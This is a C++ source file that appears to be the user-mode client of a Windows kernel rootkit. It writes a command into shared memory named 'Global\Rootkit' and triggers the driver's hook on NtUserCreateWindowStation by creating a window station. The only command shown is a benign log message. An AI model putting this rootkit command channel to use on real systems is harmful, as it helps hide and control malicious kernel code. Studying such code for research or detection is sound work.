#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <stdexcept>

typedef NTSTATUS (NTAPI* t_NtUserCreateWindowStation)(
    POBJECT_ATTRIBUTES WindowStationName,
    ACCESS_MASK DesiredAccess,
    HANDLE ObjectDirectory,
    ULONG x1,
    PVOID x2,
    ULONG Locale
);

#pragma comment(lib, "ntdll.lib")

#define CMD_LOG_MESSAGE 1

typedef struct _PAYLOAD {
    INT cmdType;
    INT status; 
    BOOL executed;
} PAYLOAD;

t_NtUserCreateWindowStation g_pFunc = NULL;

INT
main()
{
    // Create file mappings for command shared memory region
    HANDLE hMapFile = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, L"Global\\Rootkit");
    if (!hMapFile)
    {
        return 1;
    }

    PAYLOAD* pSharedBuf = (PAYLOAD*)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(PAYLOAD));
    if (!pSharedBuf)
    {
        return 2;
    }

    // Write command to shared mem
    PAYLOAD payload = { 0 };
    payload.cmdType = CMD_LOG_MESSAGE;
    payload.executed = 0;
    RtlCopyMemory(pSharedBuf, &payload, sizeof(PAYLOAD));

    // Trigger hook
    std::cout << "[*] Triggering driver" << std::endl;
    HWINSTA hWinSta = CreateWindowStationA(
        "MyWinStation",
        0,
        WINSTA_ALL_ACCESS,
        NULL
    );

    // Wait for execution and get status
    while (!pSharedBuf->executed)
        Sleep(1000);
    std::cout << "[*] Status: " << pSharedBuf->status << std::endl;
}
